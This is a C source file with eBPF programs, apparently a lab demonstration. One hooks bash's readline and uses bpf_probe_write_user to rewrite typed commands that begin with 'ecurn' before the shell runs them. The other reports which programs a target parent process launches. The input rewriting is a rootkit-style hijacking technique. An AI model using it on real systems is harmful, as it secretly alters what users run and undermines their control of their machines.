#include <vmlinux.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "snoop.bpf.h"

SEC("uretprobe/./ubuntu-fs/bin/bash:readline")
int BPF_KRETPROBE(printret, void *ret)
{
    const char ecurn[] = "ecurn";
    char ori[MAX_LINE_SIZE];
    char str[MAX_LINE_SIZE] = {0};
    char comm[TASK_COMM_LEN];
    long n;
    u32 pid;

    if (!ret) {
        return 0;
    }

    bpf_get_current_comm(&comm, sizeof(comm));
    pid = bpf_get_current_pid_tgid() >> 32;
    bpf_probe_read_user_str(ori, sizeof(ori), ret);
    n = bpf_probe_read_user_str(str, sizeof(str), ret);
    if (n < 0) {
        return 0;
    }

    for (int i = 0; i < 5; i++) {
        if (str[i] != ecurn[i]) {
            return 0;
        }
    }
    str[0] = '/';
    str[5] = '/';
    bpf_probe_write_user(ret, str, n + 1);
    bpf_printk("PID %d (%s) read: %s, modified to: %s\n", pid, comm, ori, str);

    return 0;
};

struct {
    __uint(type, BPF_MAP_TYPE_PERF_EVENT_ARRAY);
    __uint(key_size, sizeof(u32));
    __uint(value_size, sizeof(u32));
} events SEC(".maps");

const volatile int ppid_target = 0;

SEC("tracepoint/syscalls/sys_enter_execve")
int tracepoint__syscalls__sys_enter_execve(struct trace_event_raw_sys_enter* ctx)
{
    u64 id;
    pid_t pid, tgid;
    struct event event = {0};
    struct task_struct *task = 0;

    uid_t uid = (u32)bpf_get_current_uid_gid();
    id = bpf_get_current_pid_tgid();
    tgid = id >> 32;

    event.pid = tgid;
    event.uid = uid;
    task = (struct task_struct*)bpf_get_current_task();
    event.ppid = BPF_CORE_READ(task, real_parent, tgid);
    if (event.ppid != ppid_target) {
        return 0;
    }
    char *cmd_ptr = (char *) BPF_CORE_READ(ctx, args[0]);
    bpf_probe_read_str(&event.comm, sizeof(event.comm), cmd_ptr);
    bpf_perf_event_output(ctx, &events, BPF_F_CURRENT_CPU, &event, sizeof(event));

    return 0;
}

char LICENSE[] SEC("license") = "GPL";
